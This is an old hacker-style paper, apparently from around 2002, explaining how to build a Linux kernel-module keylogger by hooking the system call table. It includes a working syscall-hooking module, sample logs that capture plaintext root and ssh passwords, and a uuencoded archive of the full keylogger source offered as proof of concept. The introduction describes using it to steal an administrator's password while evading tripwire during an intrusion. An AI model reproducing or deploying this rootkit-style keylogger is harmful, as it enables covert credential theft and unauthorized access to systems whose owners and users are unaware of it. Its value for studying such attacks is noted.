@@ -1,0 +1,557 @@
+   Kernel Based Keylogger                                          by mercenary
+
+   There is a wide variety of keyloggers for Windows and only a few crippled on
+es for
+   Linux. This paper describes some basic concepts, used techniqes and hits. I'
+ve
+   also included proof of concept LKM code which was tested "in the wild". A mu
+st
+   read for every pen tester, system administrator and honeypot freak :)
+                                                  no comments | post a comment
+   
+|=-----------------------=[ Kernel Based Keylogger ]=-----------------------=|
+|=--------------------------------------------------------------------------=|
+|=---------------------=[ mercenary <bm63p@yahoo.com>]=---------------------=|
+
+
+
+
+----[ Contents
+
+    -[1] Introduction
+
+    -[2] Crash course in malicious LKM
+
+    -[3] Cracking the Nut
+
+    -[4] Some details
+
+        (1) "Special" characters handling
+
+        (2) BackSpace and Ctrl+U issues
+
+        (3) Timestamps
+
+    -[5] Known bugs, TODO
+
+    -[6] Links
+
+    -[7] Proof of concept code
+
+
+
+
+
+----[1] Introduction
+
+
+   Recently, while performing a penetration test for a corporate client, there
+was point where I had root access to an external Linux server.One of the system
+administrators used to log locally there, and then he ssh'ed to some servers
+located on the internal network (which was my goal) of the corporation. I was
+trying to get his password (no it wasn't the same as that on the external Linux
+box). My first thought was to use a trojaned ssh client (Solars' article), but
+there was a tripwire installed and i didn't want to trigger any alarms. Almost
+at the same time there was a discussion on Honeypots mail list[6.1] about Linux
+keyloggers and their use with honeypots. Three programs were discussed in that
+thread, but none ot them seemed to satisfy my needs - stealth little proggie,
+working with recent Linux distros[*], capable of loging local logins and ssh
+sessions to and from the host. Anyway I decided to write my own tool.
+Ultimately the best tools are those written by yourself.
+   In the course of time I've changed the original concept and besides logging
+local logins and ssh ones I've  added support for telnet, timestamps, some
+"special" characters handling[4.1], UID of logged user and the exact terminal
+she writes to. Since we work at kernel level nothing can be hidden from us.
+
+
+------
+*Note: This LKM is tested _only_ with Slackware 8.0 (2.4.5). Some slight
+       modifications of timestamp routine is _needed_ so it can work with other
+       Linux distros. Check 4.3. for details.
+
+
+
+
+----[2] Crash course in malicious LKM
+
+
+   When programming in userspace we use libc functions like open(), mkdir(),
+read(), write() etc... In kernelspace there are corresponding functions -
+sys_open(), sys_mkdir(), sys_read(), sys_write() and so (you can check
+/usr/include/bits/syscall.h for complete list of all). These system calls are
+implemented in kernel. Whenever someone uses mkdir() in userspace, mkdir()
+"calls" to relevant system call, in this case it's sys_mkdir(). So this is like
+a transition between userspace and kernelspace. Then the kernel process the
+arguments of the sys_read(), makes some decision and returns the result to
+userland. It's simple. More information about how the system calls works,
+you can find here - [6.2].
+   When someone types this in console:
+
+root@merc_lab:~/lkm# mkdir bahur
+root@merc_lab:~/lkm#
+
+   the mkdir shell command uses libc function mkdir() to create a directory.
+The command must know where sys_mkdir() is located in memory. Structure
+sys_call_table[] holds pointers to all system calls:
+
+
+.____________.    .__________.    ._______.  .______________.    .________.
+|            |    |          |    |s c  t |  |              |    |        |
+| user types:|    | function:|    |y a  a |  | system call: |    |  file  |
+|            |--->|          |--->|s l  b |->|              |--->|        |
+| mkdir bahur|    | mkdir()  |    |  l  l |  | sys_mkdir()  |    | system |
+|            |    |          |    |     e |  |              |    |        |
+|____________|    |__________|    |_______|  |______________|    |________|
+
+
+   Absolutely all kernel based rootkits use the same technique: in structure
+sys_call_table[] the pointer to the legitimate system call (sys_mkdir() in our
+case) is changed. Now it points to our own system call (hacked_mkdir()). This
+change is possible, because sys_call_table[] is exported by kernel and
+read/write access is granted. Then our own system call makes some decision, it
+can use the original system call (we saved his pointer) and returns a result to
+userland. It acts just like the original system call. User hardly can tell if
+there is a fake call or not:
+
+
+.____________.    .__________.    ._______.  .______________.    .________.
+|            |    |          |    |s c  t |  |              |    |        |
+| user types:|    | function:|    |y a  a |  | system call: |    |  file  |
+|            |--->|          |--->|s l  b |->|              |--->|        |
+| mkdir bahur|    | mkdir()  |    |  l  l |  |hacked_mkdir()|    | system |
+|            |    |          |    |     e |  |              |    |        |
+|____________|    |__________|    |_______|  |______________|    |________|
+                                                 |     ^
+                                                 |     |
+                                             .___|_____|____.
+                                             |              |
+                                             | original     |
+                                             | system call: |
+                                             | sys_mkdir()  |
+                                             |              |
+                                             |______________|
+
+
+I'll demonstrate the idea with a simple example:
+
+
+/***
+****    (C) 2001 by mercenary bm63p@yahoo.com
+***/
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/string.h>
+#include <sys/syscall.h>
+
+extern void *sys_call_table[];                      // export the structure
+
+int (*original_mkdir)(const char *pathname, mode_t mode);  // pointer to the
+                                                           // original
+                                                           // sys_mkdir()
+
+
+int hacked_mkdir(const char *pathname, mode_t mode) {   // "our" sys_mkdir()
+
+    if ( strcmp(pathname, "bahur") == 0 )
+          return -ENOMEM;
+
+    return original_mkdir (pathname, mode);          // Let the original
+                                                     // handle it.
+}
+
+
+int init_module () {
+
+    original_mkdir = sys_call_table[ SYS_mkdir ];   // we save the pointer
+                                                    // to sys_mkdir()
+
+    sys_call_table[ SYS_mkdir ] = hacked_mkdir;     // now sys_mkdir()
+                                                    // points to our call
+    return 0;
+}
+
+void cleanup_module () {
+
+    sys_call_table[ SYS_mkdir ] = original_mkdir;   // restore the original
+                                                    // pointer
+}
+
+
+   When the module is loaded, every time someone tryes to create a directory,
+it refers to hacked_mkdir() instead of sys_mkdir(). *pathname is a pointer to
+the name of the directory which we want to create:
+
+root@merc_lab:~/lkm# insmod mkdir.o
+root@merc_lab:~/lkm# mkdir bahur
+mkdir: cannot create directory `bahur': Cannot allocate memory
+root@merc_lab:~/lkm#
+
+   If the name is 'bahur' the we get back error (it can be any error message -
+look at man 2 mkdir). If it's not 'bahur' then the module refers to original
+sys_mkdir().
+   As you can see from this example, we can read (and change) the arguments to
+any system call.
+
+   You can check this link for more information about malicios LKMs [6.3].
+
+
+
+
+----[3] Cracking The Nut
+
+
+   Every time when a key is being pressed in active shell locally or remotely
+(through ssh, telnet, rsh etc...), it uses read() to get the keystroke:
+
+
+root@merc_lab:~/lkm# strace sh
+
+-------------<cut>---------------
+
+
+fstat64(0, 0xbffff8ec)                  = 0
+_llseek(0, 0, 0xbffff8b4, SEEK_CUR)     = -1 ESPIPE (Illegal seek)
+brk(0x80d0000)                          = 0x80d0000
+rt_sigprocmask(SIG_BLOCK, NULL, [RT_0], 8) = 0
+brk(0x80d1000)                          = 0x80d1000
+brk(0x80d2000)                          = 0x80d2000
+read(0, "l", 1)                         = 1
+read(0, "s", 1)                         = 1
+read(0, " ", 1)                         = 1
+read(0, "-", 1)                         = 1
+read(0, "a", 1)                         = 1
+read(0, "l", 1)                         = 1
+read(0, "\n", 1)                        = 1
+stat64(0x80ae40f, 0xbffff71c)           = 0
+stat64(0x80ce38c, 0xbffff62c)           = -1 ENOENT (No such file or directory)
+stat64(0x80cdb8c, 0xbffff62c)           = -1 ENOENT (No such file or directory)
+
+-------------<cut>---------------
+
+
+   Obviously read() get every keystrokes one by one as the they are being
+pressed.
+
+
+read(0, "s", 1)                         = 1
+
+
+   This means:
+
+0   - file descriptor (fd) - where we read from (0 = stdin)
+"s" - what key has been pressed
+1   - how many bytes we _want_ to read
+=1  - how many bytes has _really_ been read
+
+
+   My idea is simple, as shown in previous example we can read every result
+of any system call. So we'll read the buffer from sys_read(), if the fd = 0
+(stdin) and if the read byte is 1.Store these bytes in other buffer until Enter
+is pressed. After that the second buffer will be written in a logfile.
+   For better and clean results I've added the name of the terminal where the
+keys are pressed (tty, pts), day and month of session, UID of the active shell
+(who typed what), as well as the exact time (hour and seconds) of keystroke
+(mIRC style).
+   Here how a real sessions captured by this tool looks like:
+
+
+-------------<cut>---------------
+
+--<[vc/4]>--  --[<2002-01-22>]--  --<[UID = 0]>--   // local login as root
+                                                    // with pass "iamgod"
+<22:58:22> root
+<22:58:24> iamgod
+<22:58:30> ls -al
+
+--<[vc/5]>--  --[<2002-01-22>]--  --<[UID = 0]>--   // local login as user
+                                                    // silen with pass "l33t"
+<22:58:38> silen
+<22:58:40> l33t
+<22:58:44> ls -al
+<22:58:50> netstat -ant
+<22:58:53> su -
+<22:58:55> iamgod
+<22:59:02> ps aux
+<22:59:09> kill -9 675
+
+--<[NULL tty]>--  --[<2002-01-22>]--  --<[UID = 0]>--      // ssh login begin
+
+<22:59:26> SSH-1.5-1.0
+
+--<[pts/4]>--  --[<2002-01-22>]--  --<[UID = 1000]>--      // it's just a
+                                                           // regular user
+<22:59:34> cd /root
+<22:59:36> ls -al
+<22:59:44> su -
+<22:59:46> iamgod
+<22:59:51> df -h
+<23:00:01> du -h /root
+
+--<[vc/5]>--  --[<2002-01-22>]--  --<[UID = 0]>--
+
+<23:00:19> cat /tmp/log
+<23:05:05> ssh -l kitaeca aaa.bbb.ccc.ddd    // login to remote host
+                                             // aaa.bbb.ccc.ddd as user
+                                             // "kitaeca"
+<23:05:18> SSH-1.5-1.2.27
+<23:05:29> kitaeca                           // with pass "kitaeca"
+<23:05:41> su -
+<23:05:44> TheGreatWall                      // roots pass is "TheGreatWall"
+<23:05:52> pstree -anp
+<23:06:09> exit
+<23:06:11> exit
+<23:06:17> lsmod                             // the commands are to our host
+<23:06:20> rmmod kkeylogger                  // unloading this keylogger
+
+-------------<cut>---------------
+
+
+   When login is local, UID is always 0 because /bin/login runs as root.
+   When login is remote with ssh to our box, the user pass can't be logged,
+since it's encrypted and it's not been transferred to any shell. However we
+can still log the whole session.
+
+
+
+
+----[4] Some details
+
+
+      (1) "Special" characters handing
+
+   "Special" characters - I mean keys like F1-F12, Arrows, Tab, PgUp, PgDn,
+Home, End... Linux reads the "usual" keys as their corresponding ASCII (one
+byte) codes: a = 0x61, b = 0x62 etc. The "Special" characters however are being
+read by Linux as 3,4 or 5 bytes codes, and the first two bytes are always same-
+0x1B and then 0x5B. For example:
+
+
+root@merc_lab:~/lkm# strace -xx sh
+
+-------------<cut>---------------
+
+brk(0x80d1000)                        = 0x80d1000
+brk(0x80d2000)                        = 0x80d2000
+read(0, "\x1b", 1)                    = 1      // pressed key is F1
+read(0, "\x5b", 1)                    = 1
+read(0, "\x5b", 1)                    = 1
+read(0, "\x41", 1)                    = 1
+read(0, "\x1b", 1)                    = 1      // pressed key is F1
+read(0, "\x5b", 1)                    = 1
+read(0, "\x5b", 1)                    = 1
+read(0, "\x42", 1)                    = 1
+read(0, "\x0a", 1)                    = 1      // pressed key is Enter
+stat64(0x80ae40f, 0xbffff71c)         = 0
+stat64(0x80ce3cc, 0xbffff62c)         = -1 ENOENT (No such file or directory)
+stat64(0x80ce3cc, 0xbffff62c)         = -1 ENOENT (No such file or directory)
+
+-------------<cut>---------------
+
+
+   Here is how all of these are read by read():
+
+Three byte keys:
+#################
+
+UpArrow:     0x1B 0x5B 0X41
+DownArrow:   0x1B 0x5B 0X42
+RightArrow:  0x1B 0x5B 0x43
+LeftArrow:   0x1b 0x5B 0x44
+Beak(Pause): 0x1b 0x5B 0x50
+
+
+Four byte keys:
+################
+
+F1:          0x1b 0x5B 0x5B 0x41
+F2:          0x1b 0x5B 0x5B 0x42
+F3:          0x1b 0x5B 0x5B 0x43
+F4:          0x1b 0x5B 0x5B 0x44
+F5:          0x1b 0x5B 0x5B 0x45
+Ins:         0x1b 0x5B 0x32 0x7E
+Home:        0x1b 0x5B 0x31 0x7E
+PgUp:        0x1b 0x5B 0x35 0x7E
+Del:         0x1b 0x5B 0x33 0x7E
+End:         0x1b 0x5B 0x34 0x7E
+PgDn:        0x1b 0x5B 0x36 0x7E
+
+
+Five byte keys:
+################
+
+F6:          0x1b 0x5B 0x31 0x37 0x7E
+F7:          0x1b 0x5B 0x31 0x38 0x7E
+F8:          0x1b 0x5B 0x31 0x39 0x7E
+F9:          0x1b 0x5B 0x32 0x30 0x7E
+F10:         0x1b 0x5B 0x32 0x31 0x7E
+F11:         0x1b 0x5B 0x32 0x33 0x7E
+F12:         0x1b 0x5B 0x32 0x34 0x7E
+
+
+   The LKM is coded to capture all of these keys[*]:
+
+
+-------------<cut>---------------
+
+--<[vc/5]>--  --[<2002-01-22>]--  --<[UID = 0]>--
+
+<23:56:24> netst[Tab]-ant
+<23:56:29> cat /tmp/log
+<23:57:05> [Up.Arrow][Up.Arrow]
+<23:57:18> [F5][F4][F3]
+<23:57:19> [Up.Arrow][Down.Arrow]
+<23:57:23> rmmod kkeylogger
+
+-------------<cut>---------------
+
+
+------
+*Note: This has been tested only with local logins!
+
+
+      (2) BackSpace and Ctrl+U issues
+
+   This tool watches for keystroke "BackSpace" (if local login 0x7F, if remote
+0x08) and erases the last recorded character in second buffer. It also watches
+for Ctrl+U (0x15 - both local and remote) which removes the whole row.
+
+
+      (3) Timestamps
+
+   This is done by reading /proc/driver/rtc (rtc stands for Real Time Clock).
+Well you'll agree that this is dirty, but hey, it's quick and it works for me
+(Slackware Linux). There is no such file in Redhat Linux for example, so if you
+try to port this tool to some other Linux distro, you've got three options:
+remove the timestamp routine, rewrite the tool so it reads timestamps from
+/etc/localtime (it's standart for every Linux distro), or write your function
+that will calculate current time from the number of seconds elapsed since
+00:00:00 on January 1, 1970 since there is a pointer to these seconds -
+current->xtime.tv_sec (linux/sched.h).
+
+
+
+
+----[5] Known Bugs, Todo
+
+
+   There is a nasty bug which causes segfault in current shell, when unloading
+the LKM (rmmod kkeylogger). However it only occurs when someone logged in,
+presses a key on a terminal which is different than the one, the LKM has been
+unloaded from.
+   Currently this tool can't log properly "X" sessions. Well it logs them, but
+besides the actual pressed keys, a lot of garbage is being logged too.
+
+   There may be other bugs sinse this tool is considered as early alpha
+release.
+
+
+
+
+----[6] Links
+
+
+[1] http://www.securityfocus.com/archive/119/250274
+[2] http://www.linuxdoc.org/HOWTO/Module-HOWTO/index.html
+[3] http://www.packetst0rm.net/lkm.html[*]
+
+
+------
+*Note: This link is dead because www.packetst0rm.net is private right now, but
+       you can still find the paper in googles cache.
+
+
+
+
+----[7] Proof of concept code
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+begin 644 kkeylogger.tgz
+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
+9>1`_)2P"_K?_1Y#_7W_)Z]\`*9X<`"@`````
+`
+end
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGPfreeware 7.0.3 for non-commercial use <http://www.pgp.com>
+
+iQA/AwUBPFCG7+lvz6sDBzRpEQKFNwCeJf6NS8oza1zRjBbYdNN+qLNB+y8An3xj
+5KrGGsaavqoVwjKPWB0gQGhB
+=lXyb
+-----END PGP SIGNATURE-----
+
+
+
+-----------------------
+(C) 2002 by mercenary
+
+Security Consultant
+
+bm63p@yahoo.com
+
+
